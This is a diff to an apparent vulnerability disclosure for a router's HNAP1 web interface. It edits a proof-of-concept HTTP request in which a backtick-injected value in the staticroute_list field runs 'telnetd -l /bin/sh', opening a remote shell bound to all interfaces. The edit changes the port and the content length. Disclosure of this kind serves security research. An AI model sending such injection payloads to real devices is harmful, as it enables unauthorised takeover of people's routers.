@@ -36,7 +36,7 @@ Based on the cause of the vulnerability, attackers can arbitrarily execute the c
 ```
 POST /HNAP1/ HTTP/1.1
 Host: 192.168.0.1
-Content-Length: 50
+Content-Length: 183
 Accept: application/json
 HNAP_AUTH: 5E736BA3725CFF7870DC7A1B6B9512E6 1703160655517
 SOAPACTION: "http://purenetworks.com/HNAP1/SetStaticRouteSettings"
@@ -49,7 +49,7 @@ Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
 Cookie: uid=akiKeInk; PrivateKey=880D5E30644E82353544D9496CA35B50; timeout=51
 Connection: close
 
-{"SetStaticRouteSettings":{"staticroute_list":"`telnetd -l /bin/sh -p 10000 -b 0.0.0.0`,255.255.255.255,192.168.0.1,wan"}}
+{"SetStaticRouteSettings":{"staticroute_list":"`telnetd -l /bin/sh -p 8888 -b 0.0.0.0`,255.255.255.255,192.168.0.1,wan"}}
 ```
 
 ![image-20240421163827190](./img/3.png)
